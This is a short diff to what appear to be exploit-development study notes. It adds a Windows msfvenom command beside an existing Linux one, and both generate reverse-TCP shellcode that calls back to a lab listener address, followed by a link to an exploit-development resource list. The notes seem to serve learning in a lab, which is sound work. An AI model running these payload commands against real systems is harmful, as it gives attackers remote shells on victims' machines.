@@ -200,6 +200,7 @@
 
 # msfencode command for generating shellcode
 		msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.0.2.14 --smallest -b "\x00" -f c
+		msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.0.2.11 --smallest -b "\x00" -f c
 			
 ## Resources
 https://github.com/FabioBaroni/awesome-exploit-development/blob/master/README.md
